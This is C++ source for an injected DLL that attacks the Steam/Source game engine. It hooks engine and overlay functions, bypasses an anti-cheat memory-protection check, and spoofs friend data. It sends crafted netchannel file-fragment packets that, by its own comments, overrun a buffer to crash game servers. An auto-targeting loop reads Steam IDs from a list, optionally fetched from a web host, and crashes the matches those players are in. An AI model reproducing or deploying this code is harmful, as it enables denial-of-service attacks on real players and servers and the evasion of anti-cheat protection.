// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "bitbuf.h"
#include <Windows.h>
#include <cstdint>
#include <TlHelp32.h>
#include <Psapi.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <ShlObj.h>
#include <cstddef>
#include <memory>
#include <sapi.h>

#include "sdk/public/steam/isteamnetworking.h"
#include "sdk/public/steam/steam_api.h"
#include "sdk/public/steam/isteamfriends.h"
#include "MinHook/MinHook.h"
#include "MemoryTools/MemoryTools.h"

#include "checksum_crc.h"

#pragma comment(lib, "Urlmon.lib")

#define INRANGE(x,a,b)    (x >= a && x <= b) 
#define getBits( x )    (INRANGE((x&(~0x20)),'A','F') ? ((x&(~0x20)) - 'A' + 0xa) : (INRANGE(x,'0','9') ? x - '0' : 0))
#define getByte( x )    (getBits(x[0]) << 4 | getBits(x[1]))
#define NETMSG_TYPE_BITS	5	// must be 2^NETMSG_TYPE_BITS > SVC_LASTMSG

static ISpVoice* g_pVoice = NULL;
bool g_bNukerNuking = false;

class AutoWatcher {
public:
	void RequestWatch(CSteamID csID);
	void OnConnectionProblem();
	void OnServerConnect(HSteamNetConnection hConn) {
		m_hCurrConnection = hConn;
		m_bIsConnected = true;
		Beep(2000, 500);
	}

	bool bShouldCrash() { return m_bIsNuking; }
	void SetCrash() { m_bIsNuking = true; }

	HSteamNetConnection GetConnection()
	{
		return m_hCurrConnection;
	}

	bool bIsCurrentlyConnected()
	{
		return m_bIsConnected;
	}



private:
	bool m_bIsNuking = false;
	bool m_bIsConnected = false;
	HSteamNetConnection m_hCurrConnection;
};

AutoWatcher g_AutoWatch;

void* FindPattern(const char* moduleName, const char* pattern, const char* szName = nullptr)
{
	const char* pat = pattern;
	BYTE* firstMatch = 0;
	BYTE* rangeStart = (BYTE*)GetModuleHandleA(moduleName);

	if (!rangeStart)
		printf("Unable To Find Module %s!\n", moduleName);

	MODULEINFO miModInfo; GetModuleInformation(GetCurrentProcess(), (HMODULE)rangeStart, &miModInfo, sizeof(MODULEINFO));
	BYTE* rangeEnd = rangeStart + miModInfo.SizeOfImage;

	if (!miModInfo.SizeOfImage)
		printf("Unable To Find Module %s!\n", moduleName);

	if (rangeStart >= rangeEnd)
		printf("Bad Range! %s\n", moduleName);

	for (BYTE* pCur = rangeStart; pCur < rangeEnd; pCur++)
	{
		if (!*pat)
			return firstMatch;

		if (*(PBYTE)pat == '\?' || *(BYTE*)pCur == getByte(pat))
		{
			if (!firstMatch)
				firstMatch = pCur;

			if (!pat[2])
				return firstMatch;

			if (*(PWORD)pat == '\?\?' || *(PBYTE)pat != '\?')
				pat += 3;

			else
				pat += 2;    //one ?
		}
		else
		{
			pat = pattern;
			firstMatch = 0;
		}
	}

	if (szName)
		printf("Failed to find pattern for %s in %s. (%s)\n", szName, moduleName, pat);
	else
		printf("Failed to find pattern in %s. (%s)\n", moduleName, pat);
	return NULL;
}

void HexPrint(
	const char* desc,
	const void* addr,
	const int len,
	int perLine
) {
	// Silently ignore silly per-line values.

	if (perLine < 4 || perLine > 64) perLine = 16;

	int i;
	unsigned char* buff = (unsigned char*)malloc(perLine + 1);
	const unsigned char* pc = (const unsigned char*)addr;

	// Output description if given.

	if (desc != NULL) printf("%s:\n", desc);

	// Length checks.

	if (len == 0) {
		printf("  ZERO LENGTH\n");
		free(buff);
		return;
	}
	if (len < 0) {
		printf("  NEGATIVE LENGTH: %d\n", len);
		free(buff);
		return;
	}

	// Process every byte in the data.

	for (i = 0; i < len; i++) {
		// Multiple of perLine means new or first line (with line offset).

		if ((i % perLine) == 0) {
			// Only print previous-line ASCII buffer for lines beyond first.

			if (i != 0) printf("  %s\n", buff);

			// Output the offset of current line.

			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.

		printf(" %02x", pc[i]);

		// And buffer a printable ASCII character for later.

		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) // isprint() may be better.
			buff[i % perLine] = '.';
		else
			buff[i % perLine] = pc[i];
		buff[(i % perLine) + 1] = '\0';
	}

	// Pad out last line if not exactly perLine characters.

	while ((i % perLine) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII buffer.

	printf("  %s\n", buff);
	free(buff);
}

class net_channel
{
public:
	char pad[24];
	__int32 out_sequence_nr;
	__int32 in_sequence_nr;
	__int32 reliable_state;
};

#define NET_MAX_MESSAGE 523956
#define PACKET_FLAG_RELIABLE			(1<<0)	// packet contains subchannel stream data
#define FRAGMENT_BITS		8
#define FRAGMENT_SIZE		(1<<FRAGMENT_BITS)
#define BYTES2FRAGMENTS(i) ((i+FRAGMENT_SIZE-1)/FRAGMENT_SIZE)
#define NET_MAX_PAYLOAD_BITS 19
#define MAX_FILE_SIZE_BITS 26
#define MAX_FILE_SIZE		((1<<MAX_FILE_SIZE_BITS)-1)	// maximum transferable size is	64MB
#define	FRAG_NORMAL_STREAM	0
#define FRAG_FILE_STREAM	1
#define ENCODE_PAD_BITS( x ) ( ( x << 5 ) & 0xff )
#define DECODE_PAD_BITS( x ) ( ( x >> 5 ) & 0xff )



FORCEINLINE unsigned short BufferToShortChecksum(const void* pvData, size_t nLength)
{
	CRC32_t crc = CRC32_ProcessSingleBuffer(pvData, nLength);

	unsigned short lowpart = (crc & 0xffff);
	unsigned short highpart = ((crc >> 16) & 0xffff);

	return (unsigned short)(lowpart ^ highpart);
}


// Writes a NETMsg_Nop
void write_nop(bf_write* buffer)
{
	int size = 0;
	if ((buffer->GetNumBitsWritten() % 8) == 0)
	{
		int size_include_header = size + 1 + buffer->ByteSizeVarInt32(0) + buffer->ByteSizeVarInt32(size);
		if (buffer->GetNumBytesLeft() >= size_include_header)
		{

			buffer->WriteVarInt32(0);
			buffer->WriteVarInt32(size);

			buffer->SeekToBit(buffer->GetNumBitsWritten() + (size * 8));
		}
	}

	// Valve you should be using malloca here in your CNetMessagePBBinder class!
	void* serializeBuffer = _malloca(size);
	buffer->WriteVarInt32(0);
	buffer->WriteVarInt32(size);
	buffer->WriteBytes(serializeBuffer, size);
	_freea(serializeBuffer);
}

// \x55\x8B\xEC\xB8??\x00\x00\xE8????\x53\x8B\xD9\x56\x57\x8B\xFA
#pragma optimize("", off);
#include <vector>
int NET_SendPacket(net_channel* _this, unsigned char* a1, int a2, void* a3, bool a4)
{
	typedef int((__fastcall* NET_SendPacketFunc_t)(net_channel*, unsigned char*, int, void*, bool));
	static NET_SendPacketFunc_t oNET_SendPacket = (NET_SendPacketFunc_t)FindPattern("engine", "55 8B EC B8 ? ? 00 00 E8 ? ? ? ? 53 8B D9 56 8B F2 89 5D EC");
	// E8 ? ? ? ? C7 87 ? ? ? ? ? ? ? ? 83 C4 0C
	
	int	bytesSent = 0;
	_asm {
		push a4
		push a3
		push a2
		mov edx, a1
		mov ecx, _this
		call oNET_SendPacket
		add esp, 12
		mov bytesSent, eax
	};
	//int	bytesSent = oNET_SendPacket(this, a1, a2, a3, a4);
	//_asm add esp, 12
	return bytesSent;
}

void SendCrashData(net_channel* netchan) {

	static char	send_buf[NET_MAX_MESSAGE];
	memset(send_buf, 0, ARRAYSIZE(send_buf));

	bf_write send(send_buf, ARRAYSIZE(send_buf));
	static int nIndex = 0;
	if (nIndex > 1)
		nIndex = 0;

	unsigned char flags = 0;

	// start writing packet
	send.WriteLong(netchan->out_sequence_nr);
	send.WriteLong(netchan->in_sequence_nr);

	bf_write flagsPos = send; // remember flags byte position
	flags |= PACKET_FLAG_RELIABLE;

	send.WriteByte(0);
	send.WriteShort(0);  // write correct checksum later

	int nCheckSumStart = send.GetNumBytesWritten();
	send.WriteByte(netchan->reliable_state);
#define CRASHER_CODE_HERE
#ifdef CRASHER_CODE_HERE
	// Write Reliable Crash Data
	bf_write* buf = &send;
	buf->WriteUBitLong(0, 3); // indx 0
	buf->WriteOneBit(0); // no data for this stream
	buf->WriteOneBit(1); // data for file stream

	int startfragment = 0;
	int numfragments = 0;

	if (nIndex == 0)
	{
		// Allocate The Buffer
		startfragment = 0;
		numfragments = 0;
	}
	else if (nIndex == 1)
	{
		// Cause the buffer overrun
		//0 -= rest (our values in nuclear_value)
		startfragment = 1;
		numfragments = 0;
	}

	buf->WriteOneBit(1); // uses fragments with start fragment offset byte
	buf->WriteUBitLong(startfragment, (MAX_FILE_SIZE_BITS - FRAGMENT_BITS));
	buf->WriteUBitLong(numfragments, 3);

	int offset = nIndex * FRAGMENT_SIZE;
	if (offset == 0)
	{
		// this is the first fragment, write header info
		buf->WriteOneBit(1); // file transmission net message stream
		buf->WriteUBitLong(rand() % UINT_MAX, 32);
		buf->WriteString("FILENAME"); //send random file name
		buf->WriteOneBit(0);
		buf->WriteOneBit(0);

		//Send random file size to get the server to allocate to new pointers instead of the same one every time (IMemAlloc)
		//Must be a prime number or you will get kicked due to a bf_read overflow
		//this is due to the way padding works with the bitbuffer class (byte-aligned)
		static unsigned int counter = 0;
		static std::vector<int> nuclear_value = { 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97 , 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151 };
		static int counter_incrementer = nuclear_value.size() % 7 ? 8 : 7;
		const int value = nuclear_value.at(counter % nuclear_value.size());
		buf->WriteUBitLong(value, MAX_FILE_SIZE_BITS); // 4MB max for files
		counter += counter_incrementer;
		//printf("Overruning Buffer by %d bytes!\n", 255 - value);
		
	}

	// Seems Like Valve Changed Something So Message Boundaries are wrong,
	// just write *8 bytes to stop us from crashing
	int nSkip = (buf->GetNumBitsWritten() % 8) * 8;
	for (int i = 0; i < nSkip; i++)
		buf->WriteByte(0); // Pad buffer up to nearest net message (so we don't get unable to read net message// overflow!)
	// We pad with zeros so it is read as a netmsg_nop, and doesn't process anymore

#endif
	// Back to senddatagramcode 

	// Deal with packets that are too small for some networks
	while (send.GetNumBytesWritten() < 1200)
	{
		// Go ahead and pad some bits as long as needed
		write_nop(buf);

	}

	// Make sure we have enough bits to read a final net_NOP opcode before compressing 
	int nRemainingBits = send.GetNumBitsWritten() % 8;
	if (nRemainingBits > 0 && nRemainingBits <= (8 - NETMSG_TYPE_BITS))
	{
		write_nop(buf);
	}

	nRemainingBits = send.GetNumBitsWritten() % 8;
	if (nRemainingBits > 0)
	{
		int nPadBits = 8 - nRemainingBits;

		flags |= ENCODE_PAD_BITS(nPadBits);

		// Pad with ones
		if (nPadBits > 0)
		{
			unsigned int unOnes = GetBitForBitnum(nPadBits) - 1;
			send.WriteUBitLong(unOnes, nPadBits);
		}
	}

	flagsPos.WriteByte(flags);


	const void* pvData = send.m_pData + nCheckSumStart;
	!(send.GetNumBitsWritten() % 8);
	int nCheckSumBytes = send.GetNumBytesWritten() - nCheckSumStart;
	unsigned short usCheckSum = BufferToShortChecksum(pvData, nCheckSumBytes);

	flagsPos.WriteUBitLong(usCheckSum, 16);


	int	bytesSent  = NET_SendPacket(netchan, (unsigned char*)send.m_pData, send.GetNumBytesWritten(), 0, false);


	netchan->out_sequence_nr++;

	nIndex++;
	if (nIndex == 0)
		SendCrashData(netchan);
}





LPVOID orginal_send_datagram = 0;
int __fastcall hk_send_datagram(net_channel* netchan, void*, bf_write* buf)
{
	if (!GetAsyncKeyState(VK_HOME))
	{
		return  (((int(__thiscall*)(net_channel*, bf_write*))orginal_send_datagram)(netchan, buf));
	}

	SendCrashData(netchan);

	return netchan->out_sequence_nr;
}
#pragma optimize("", on);


void __fastcall hk_RegisterGetAsyncKeyStateCall(void* _this, void* edx, int nKey, void* pCallingFunc, int is_zero)
{
	// i'm tired of getting VAC banned on my own hosted de server when testing...
	return;
}

void BypassVirtualProtectChecks()
{
	// 85 E4
	DWORD dwOldProtect;
	void** ppCallToVirtualProtect = (void**)FindPattern(
		"gameoverlayrenderer",
		"57 50 56 FF 75 ? C7 45 FC 00 00 00 00 FF 75 08 FF 15 ? ? ? ? 8B F8 FF 15 ? ? ? ? 80 3D ? ? ? ? 00 8B D8 74 3C 56 B9 ? ? ? ? E8 ? ? ? ? 84 C0"
	);

	void* oVirtualProtect = **(void***)((char*)ppCallToVirtualProtect + 18);
	void* pIsPageProtectionExecuteReadWriteFunc = FindPattern(
		"gameoverlayrenderer",
		"55 8B EC 83 7D 08 40 0F 94 C0 5D C2 04 00"
	);

	((decltype(&VirtualProtect))oVirtualProtect)(pIsPageProtectionExecuteReadWriteFunc, 14, PAGE_READWRITE, &dwOldProtect);

	*((unsigned char*)pIsPageProtectionExecuteReadWriteFunc + (sizeof(char) * 3)) = 0x90;
	*((unsigned char*)pIsPageProtectionExecuteReadWriteFunc + (sizeof(char) * 4)) = 0x85;
	*((unsigned char*)pIsPageProtectionExecuteReadWriteFunc + (sizeof(char) * 5)) = 0xE4;
	*((unsigned char*)pIsPageProtectionExecuteReadWriteFunc + (sizeof(char) * 6)) = 0x90;

	((decltype(&VirtualProtect))oVirtualProtect)(pIsPageProtectionExecuteReadWriteFunc, 14, dwOldProtect, &dwOldProtect);

	// Is It PAGE_EXECUTE_READWRITE? Nah....

}





void* g_pFriends = 0;
ISteamNetworking* g_pSteamNetworking = nullptr;
ISteamNetworkingSockets* g_pSteamNetworkingSockets = nullptr;
ISteamNetworkingUtils* g_pSteamNetworkingUtils = nullptr;
void InitSteam() {

	if (auto steam_api = reinterpret_cast<std::uintptr_t>(GetModuleHandleA("steam_api.dll"))) {

#define STEAM_FUNC(NAME) ((decltype(&NAME))GetProcAddress( reinterpret_cast<HMODULE>(steam_api), #NAME))
		const auto user = STEAM_FUNC(SteamAPI_GetHSteamUser)();
		const auto pipe = STEAM_FUNC(SteamAPI_GetHSteamPipe)();
		const auto steam_client = STEAM_FUNC(SteamClient)();
#undef STEAM_FUNC	



		HMODULE moduleHandle = GetModuleHandleA("steamnetworkingsockets.dll");

		if (!moduleHandle) {
			throw std::exception("Module Handle was nullptr!");
		}

		//FARPROC procAddr = GetProcAddress(GetModuleHandleA("steamnetworkingsockets.dll"), "SteamNetworkingUtils_LibV3");
		//if (procAddr) {
			//auto steamNetworkingUtils = ((ISteamNetworkingUtils * (*)())procAddr)();// (ISteamNetworkingUtils * )steam_client->GetISteamGenericInterface(user, pipe, STEAMNETWORKINGUTILS_INTERFACE_VERSION);
		//}
		//else {
			//throw std::exception("procAddr was Invalid");
		//}
		//auto steamNetworkingSockets = ((ISteamNetworkingSockets * (*)())GetProcAddress(moduleHandle, "SteamNetworkingSockets_LibV9"))();
		//auto steamNetworkingMessages = ((ISteamNetworkingMessages * (*)())GetProcAddress(moduleHandle, "SteamNetworkingMessages_LibV2"))();
		g_pFriends = steam_client->GetISteamFriends(user, pipe, STEAMFRIENDS_INTERFACE_VERSION);
		g_pSteamNetworking = steam_client->GetISteamNetworking(user, pipe, STEAMNETWORKING_INTERFACE_VERSION);
		g_pSteamNetworkingUtils = (ISteamNetworkingUtils * )steam_client->GetISteamGenericInterface(user, pipe, STEAMNETWORKINGUTILS_INTERFACE_VERSION);
		g_pSteamNetworkingSockets = (ISteamNetworkingSockets*) steam_client->GetISteamGenericInterface(user, pipe, STEAMNETWORKINGSOCKETS_INTERFACE_VERSION);

	}
	else {
		printf("No Steam API!\n");
	}
}
std::vector<CSteamID> friends;




class MinHook {
public:
	void init(void* base) noexcept;
	void restore() noexcept {}
	void hookAt(std::size_t index, void* fun) noexcept;
	void hook(void* fun) noexcept;

	template<typename T, std::size_t Idx, typename ...Args>
	constexpr auto getOriginal(Args... args) const noexcept
	{
		return reinterpret_cast<T(__thiscall*)(void*, Args...)>(originals[Idx]);
	}

	auto getOriginalPtr(int idx) noexcept
	{
		return originals[idx];
	}

	template<typename T, std::size_t Idx, typename ...Args>
	constexpr auto callOriginal(Args... args) const noexcept
	{
		return getOriginal<T, Idx>(args...)(base, args...);
	}


	constexpr void* getThis() const noexcept
	{
		return base;
	}


private:
	void* base;
	std::unique_ptr<uintptr_t[]> originals;
};

static auto calculateVmtLength(uintptr_t* vmt) noexcept
{
	std::size_t length = 0;
	MEMORY_BASIC_INFORMATION memoryInfo;
	while (VirtualQuery(LPCVOID(vmt[length]), &memoryInfo, sizeof(memoryInfo)) && memoryInfo.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))
		length++;
	return length;
}

void MinHook::init(void* base) noexcept
{
	this->base = base;
	originals = std::make_unique<uintptr_t[]>(calculateVmtLength(*reinterpret_cast<uintptr_t**>(base)));
}

void MinHook::hookAt(std::size_t index, void* fun) noexcept
{
	void* orig;
	MH_CreateHook((*reinterpret_cast<void***>(base))[index], fun, &orig);
	originals[index] = uintptr_t(orig);
}

void MinHook::hook(void* fun) noexcept
{
	void* orig;
	MH_CreateHook((*reinterpret_cast<void***>(base)), fun, &orig);
	originals[0] = uintptr_t(orig);
}


class hook_
{
public:
	hook_() {}
	MinHook steamFriends;
	MinHook steamNetworkingSockets;
};

hook_* hooks = new hook_();

static int nRealFriendCount = 0;
int __fastcall hk_GetFriendCount(void* ecx, void* edx, int iFriendFlags) {
	//Debug::QuickPrint("[FriendSpoof] GetFriendCount();\n");
	/* Set Up Our Friends */
	//static bool init{ false };
	if (true) {
		//init = true;
		friends.clear();
		std::ifstream playerFile;
		char path[MAX_PATH];
		HRESULT hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL,
			SHGFP_TYPE_CURRENT, path);
		//strcat(path, "\\Friends.txt");
		strcat(path, "\\AutoNuke.txt");
		playerFile.open(path);
		int32_t id = 0;
		std::string friendsstr;
		while (getline(playerFile, friendsstr)) {
			try {
				id = std::stoi(friendsstr.c_str());
				friendsstr.erase(std::remove(friendsstr.begin(), friendsstr.end(), '\n'),
					friendsstr.end());
				//Debug::QuickPrint(("Friend ID Is Parsed = " + std::to_string(id)).c_str());
				CSteamID steamid(id, k_EUniversePublic, k_EAccountTypeIndividual);
				//steamid.SetFromString(friendsstr.c_str(), k_EUniversePublic);
				friends.push_back(steamid);

			}
			catch (std::exception& e) {
				printf(friendsstr.c_str());
			}
		}
		playerFile.close();
	}


	auto friendcount = 0;

	if (iFriendFlags & k_EFriendFlagAll /* k_EFriendFlagImmediate*/) {
		nRealFriendCount = hooks->steamFriends.callOriginal<int, 3, int>(iFriendFlags);
		friendcount = nRealFriendCount + friends.size();
	}

	//Debug::QuickPrint("[FriendSpoof] Friends: ");
	return friendcount;
}

void __fastcall hk_GetFriendByIndex(void* ecx, void* edx, std::uint64_t* retn, int iFriend, int iFriendFlags) {
	//Debug::QuickPrint("[FriendSpoof] GetFriendByIndex");

	auto id = k_steamIDNil;

	if (iFriendFlags & k_EFriendFlagAll/*k_EFriendFlagImmediate*/) {
		int realFriendCount = nRealFriendCount/*hooks->steamFriends.callOriginal<int, 3, int>(iFriendFlags) + friends.size()*/;
		if (iFriend > realFriendCount) {
			iFriend -= realFriendCount;
			id = friends[iFriend];
		}
		else if (iFriend >= 0 && ((size_t)iFriend < nRealFriendCount)) {
			//id = friends[iFriend];
			*retn = k_steamIDNil.ConvertToUint64();
			return;// k_steamIDNil;// hooks->steamFriends.callOriginal<CSteamID, 4, int, int>(iFriend, iFriendFlags);
		}
	}
	//Debug::QuickPrint("[FriendSpoof] Friend:");
	*retn = id.ConvertToUint64();
}

EFriendRelationship __fastcall hk_GetFriendRelationship(void* ecx, void* edx, CSteamID steamIDFriend) {
	return k_EFriendRelationshipFriend;
}
//

EPersonaState __fastcall hk_GetFriendPersonaState(void* ecx, void* edx, CSteamID steamIDFriend) {
	//Debug::QuickPrint("[FriendSpoof] GetFriendPersonaState");
	EPersonaState state = hooks->steamFriends.callOriginal<EPersonaState, 6, CSteamID>(steamIDFriend);
	if (state < k_EPersonaStateOnline)
		return k_EPersonaStateOnline;
	return state;
}


// 49
bool __fastcall hk_InviteUserToGame(void*, void*, CSteamID steamIDFriend, const char* pchConnectString) {

	printf(pchConnectString);
	bool ret = hooks->steamFriends.callOriginal<bool, 49, CSteamID, const char*>(steamIDFriend, pchConnectString);
	if (!ret)
		printf("Unable To Invite User");

	return ret;


}

bool __fastcall hk_GetFriendGamePlayed(void* ecx, void* edx, CSteamID steamIDFriend, STEAM_OUT_STRUCT() FriendGameInfo_t* pFriendGameInfo) {
	//bool nResult = hooks->steamFriends.callOriginal<EPersonaState, 8, CSteamID, STEAM_OUT_STRUCT() FriendGameInfo_t*>(steamIDFriend, pFriendGameInfo);
	bool nResult = true;
	if (nResult) {
		if (pFriendGameInfo) {
			pFriendGameInfo->m_unGameIP = 3494815037;
			CGameID NewID(730);
			pFriendGameInfo->m_gameID = NewID;
			pFriendGameInfo->m_usGamePort = 3;
			pFriendGameInfo->m_steamIDLobby.SetFromUint64(90144742228812806);
		}
	}
	else {}
	return nResult;
}



#include <fstream>
#include <filesystem>
inline bool exists_in_documents(const std::string& name) {
	char path[MAX_PATH];
	HRESULT hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL,
		SHGFP_TYPE_CURRENT, path);
	//strcat(path, "\\Friends.txt");
	strcat(path, ("\\" + name).c_str());

	//return true;

	return std::filesystem::exists(std::string(path));
}

#include <shellapi.h>
void AutoFetchNukeList()
{

	static uint64_t nTickCount = 0;
	if (GetTickCount64() > (nTickCount + 80000))
	{
		ShellExecuteA(NULL, "open", "cmd.exe", "/K \"cd C:\\FetchJSWebPage & python .\\main.py & exit\"", NULL, SW_HIDE);
		nTickCount = GetTickCount64();
	}
#if 0
	printf("Auto Fetching Nuke List!\n");

	const char* srcURL = "http://kda.rf.gd/AutoNuke.txt?i=1"; // 

	// the destination file 
	char path[MAX_PATH];
	HRESULT hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL,
		SHGFP_TYPE_CURRENT, path);
	strcat(path, "\\AutoNuke.txt");

	if (S_OK == URLDownloadToFileA(NULL, srcURL, path, 0, NULL))
	{
		printf("Fetched AutoNuke List!\n");
		return;
	}
	else
	{
		printf("Failed To Fetch AutoNukeList\n");
		return;
	}
#endif
}

void _AutoCrashLoop()
{
	std::vector<CSteamID> autoNukers;
	while (true)
	{
		if (exists_in_documents("dontnuke.txt"))
			continue;

		if (g_AutoWatch.bIsCurrentlyConnected())
		{
			SteamNetConnectionInfo_t connInfo;
			g_pSteamNetworkingSockets->GetConnectionInfo(g_AutoWatch.GetConnection(), &connInfo);


			if (connInfo.m_eState > k_ESteamNetworkingConnectionState_Connected || connInfo.m_eState < k_ESteamNetworkingConnectionState_None)
				g_AutoWatch.OnConnectionProblem();

			Sleep(5000);

			continue;
		}


		static uint64_t nTickCount = 0;
		if (GetTickCount64() > (nTickCount + 5000))
		{
#ifdef AUTO_FETCH_LIST_FROM_WEBPAGE
			AutoFetchNukeList();
#endif

			std::ifstream playerFile;
			char path[MAX_PATH];
			HRESULT hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL,
				SHGFP_TYPE_CURRENT, path);
			strcat(path, "\\AutoNuke.txt");
			playerFile.open(path);
			int32_t id = 0;
			std::string friendsstr;
			autoNukers.clear();
			while (getline(playerFile, friendsstr)) {
				try {
					if (friendsstr.size() <= 2)
						continue;
					else if (friendsstr.c_str()[0] == 'h')
						continue; // retard put the link in wrong
					else if (friendsstr.c_str()[0] == 'd')
						continue; // retard put the link in wrong

					id = std::stoi(friendsstr.c_str());
					friendsstr.erase(std::remove(friendsstr.begin(), friendsstr.end(), '\n'),
						friendsstr.end());
					//Debug::QuickPrint(("Friend ID Is Parsed = " + std::to_string(id)).c_str());
					CSteamID steamid(id, k_EUniversePublic, k_EAccountTypeIndividual);
					//steamid.SetFromString(friendsstr.c_str(), k_EUniversePublic);
					autoNukers.push_back(steamid);

				}
				catch (std::exception& e) {
					//printf(friendsstr.c_str());
				}
			}
			playerFile.close();




			for (auto nuker : autoNukers)
			{
				if (exists_in_documents("dontnuke.txt") || g_AutoWatch.bIsCurrentlyConnected())
					break;

				((ISteamFriends*)g_pFriends)->RequestFriendRichPresence(nuker);
				auto szRet = ((ISteamFriends*)g_pFriends)->GetFriendRichPresence(nuker, "watch");

				if (!szRet || szRet[0] == 0)
					continue;

				if (strstr("1", szRet))
				{
					const char* friendName = ((ISteamFriends*)g_pFriends)->GetFriendPersonaName(nuker);

					if (!g_AutoWatch.bShouldCrash())
					{
						

						if (!g_pVoice)
						{
							HRESULT hr;
							hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
							hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&g_pVoice);

							if(FAILED(hr))
								printf("ERROR 404 FAILED INITIALIZING COM\n");

						} 
						if(g_pVoice){
								std::string speak_string = "Nuking ";
								speak_string.append(friendName);
								std::wstring dumb_wide_type(speak_string.begin(), speak_string.end());
								hr = g_pVoice->Speak(dumb_wide_type.c_str(), SVSFlagsAsync, NULL);
						}

						
					}
					printf("We Can Pop %s!\n", friendName);
					
					//g_bNukerNuking = true;
					g_AutoWatch.RequestWatch(nuker);
					Sleep(10000);
				}
			}

			nTickCount = GetTickCount64();
		}
	}
}

bool __fastcall SetRichPresence(void* _this, void* edx, const char* pchKey, const char* pchValue)
{

	static const char* szNewPresense = "de_nukingservers";
	static const char* szStatus = "Fuckin A Bitch";
	static const char* szSteamDisplay = "#display_GameKnownMap";
	static const char* szGameState = "game";

	const char* szMessage = szNewPresense;

	if (strstr(pchKey, "status"))
		szMessage = szStatus;
	else if (strstr(pchKey, "steam_display"))
		szMessage = szSteamDisplay;
	else if (strstr(pchKey, "version"))
		szMessage = pchValue;
	else if (strstr(pchKey, "game:state"))
		szMessage = szGameState;

	//printf("RICH Presense : Setting Key (%s) with true value (%s), spoofing to %s\n", pchKey, pchValue, szMessage);

	bool ret = hooks->steamFriends.callOriginal<bool, 43, const char*, const char*>(pchKey, szMessage);
	return ret;
}
#include <thread>


decltype(&GetAsyncKeyState) oGetAsyncKeyState;

SHORT WINAPI hk_GetAsyncKeyState(
	_In_ int vKey)
{
	if ((vKey == VK_HOME) /* && g_AutoWatch.bShouldCrash()*/)
		return 0xFFFFFFFF;

	return oGetAsyncKeyState(vKey);
}

void* __fastcall RequestWatchInfoFriendsFromGC(
	void* _this,
	void* edx,
	int steamid3,
	__int64 otherID,
	__int64 steamID);

decltype(&RequestWatchInfoFriendsFromGC) oRequestWatchInfo = nullptr;

void* __fastcall RequestWatchInfoFriendsFromGC(
	void* _this,
	void* edx,
	int steamid3,
	__int64 otherID,
	__int64 steamID)
{

	auto call = _ReturnAddress();
	std::string sig;
	std::string _module;
	//MemoryTools::BuildSignaturex86(&sig, (unsigned char*)call, 50);
	//MemoryTools::GetAddressModuleName(call, &_module);
	//printf("Caller : (%s) %s\n", _module.c_str(), sig.c_str());


	return oRequestWatchInfo(_this, edx, steamid3, otherID, steamID);
}


__int16 __fastcall LoopThroughTillProtoIsFound(WORD* _this, void*, CSteamID* a2);
decltype(&LoopThroughTillProtoIsFound) oLoopForWatchableMatch = nullptr;
__int16 __fastcall LoopThroughTillProtoIsFound(WORD* _this, void*, CSteamID* a2)
{

	auto ret = oLoopForWatchableMatch(_this, 0, a2);

	if (ret == (signed)0xFFFF)
		int fuck = 1;
	//else if (ret != -1)
	//	__debugbreak();
	//else if (ret > 0)
	//	__debugbreak();



	return ret;
}
int __stdcall SomeGoTV(const char* a1);
decltype(&SomeGoTV) oGoTVThing = nullptr;
int __stdcall SomeGoTV(const char* a1)
{
	return oGoTVThing(a1);
}

HSteamNetConnection __fastcall hk_ConnectToHostedDedicatedServer(ISteamNetworkingSockets* _this, void* edx, const SteamNetworkingIdentity& identityTarget, int nRemoteVirtualPort, int nOptions, const SteamNetworkingConfigValue_t* pOptions);
decltype(&hk_ConnectToHostedDedicatedServer) oConnectToDedicatedServer = nullptr;
HSteamNetConnection __fastcall hk_ConnectToHostedDedicatedServer(ISteamNetworkingSockets* _this, void* edx, const SteamNetworkingIdentity& identityTarget, int nRemoteVirtualPort, int nOptions, const SteamNetworkingConfigValue_t* pOptions)
{
#if 0
		std::string debug_str;
		std::ofstream out_file("debug_dump.txt", std::ios::out);

		MemoryTools::GetDebugCallStackString(&debug_str, true, 200);

		out_file.write(debug_str.c_str(), debug_str.size());
		out_file.close();
		printf("Dumping Debug Log!!!\n");
		return true;
#endif

	HSteamNetConnection conn = oConnectToDedicatedServer(_this, edx, identityTarget, nRemoteVirtualPort, nOptions, pOptions);
	g_AutoWatch.OnServerConnect(conn);
	g_AutoWatch.SetCrash();
	return conn;
}



void initialize_hooks()
{

	InitSteam();


	BypassVirtualProtectChecks();
	MH_Initialize();
	void* dont_care_ptr = 0;

	void* send_datagram_address = FindPattern("engine", "55 8B EC 83 E4 F0 B8 ? ? ? ? E8 ? ? ? ? 56 57 8B F9 89 7C 24 14");
	void* valves_register_getasynckeystatecall = FindPattern("gameoverlayrenderer", "55 8B EC 8D 51 28 8B 0A 56 8B 75 0C 83 F9 32");
	void* request_watchinfo_friends_ptr = FindPattern("client", "55 8B EC 83 E4 F8 83 EC 14 53 8B 5D 08 56 57 8B F9 89 5C 24 18 8D 4C 24 18 51 8D 4F 04 E8 8E 39");
	void* loop_ptr = FindPattern("client", "55 8B EC 56 57 8B F9 B8 FF FF 00 00 0F B7 77 10 66 3B F0 74 57 53");
	void* gotv_ptr = FindPattern("client", "55 8B EC 83 E4 F8 83 EC 10 8B 4D 08 56 57 E8 ? ? ? ? 8B F0 8D 4C 24 08 8B FA 89 74 24 08 0F 57 C0 89 7C 24 0C 66 0F 13 44 24 ? E8 ? ? ? ? 84 C0 75 08 8B 7C 24 14 8B 74 24 10 80 3D ? ? ? ? ? 66 0F 13 05 ? ? ? ?");
